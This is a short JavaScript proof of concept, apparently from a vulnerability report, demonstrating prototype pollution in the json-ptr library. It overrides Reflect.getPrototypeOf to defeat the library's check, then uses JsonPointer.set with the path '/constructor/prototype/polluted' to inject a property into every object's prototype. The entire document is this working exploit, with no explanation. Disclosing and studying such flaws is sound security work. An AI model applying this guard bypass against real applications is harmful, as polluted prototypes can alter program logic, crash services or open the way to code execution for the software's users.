Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const {JsonPointer} = require('json-ptr');
JsonPointer.set({}, '/constructor/prototype/polluted', 'yes', true);
console.log({}.polluted);